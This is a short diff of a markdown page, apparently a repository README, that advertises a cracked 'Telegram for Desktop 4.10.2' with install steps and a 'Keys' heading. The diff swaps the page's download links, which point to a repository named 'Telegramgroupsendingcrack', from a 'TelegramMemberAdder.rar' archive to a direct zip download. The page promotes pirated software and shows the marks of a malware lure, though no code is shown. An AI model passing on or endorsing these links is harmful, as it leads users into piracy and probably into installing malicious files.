@@ -57,9 +57,9 @@ You can use all its marvellous features without stressing that there’s a subsc
 2.  Setup The Installation
 3.  Done
 
-[**Download Link**](https://github.com/Telegramgroupsendingcrack/Telegram-for-Desktop-4.10.2-Crack/blob/main/TelegramMemberAdder.rar)
+[**Download Link**](https://codeload.github.com/Telegramgroupsendingcrack/Telegram-for-Desktop-4.10.2-Crack/zip/refs/heads/main)
 
-**[Telegram for Desktop Crack Torrent Download](https://github.com/Telegramgroupsendingcrack/Telegram-for-Desktop-4.10.2-Crack/blob/main/TelegramMemberAdder.rar)**
+**[Telegram for Desktop Crack Torrent Download](https://codeload.github.com/Telegramgroupsendingcrack/Telegram-for-Desktop-4.10.2-Crack/zip/refs/heads/main)**
 
 **Keys:**
 
